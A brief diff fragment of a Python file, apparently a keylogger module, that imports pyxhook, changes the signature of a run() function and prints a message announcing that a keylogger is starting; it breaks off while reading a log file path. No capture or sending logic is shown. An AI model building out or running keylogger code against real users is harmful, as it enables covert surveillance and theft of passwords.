@@ -2,7 +2,7 @@
 import os
 import pyxhook
 
-def run(**args):
+def run():
     print("[*] starting keylogger.")
     
     log_file = os.environ.get(
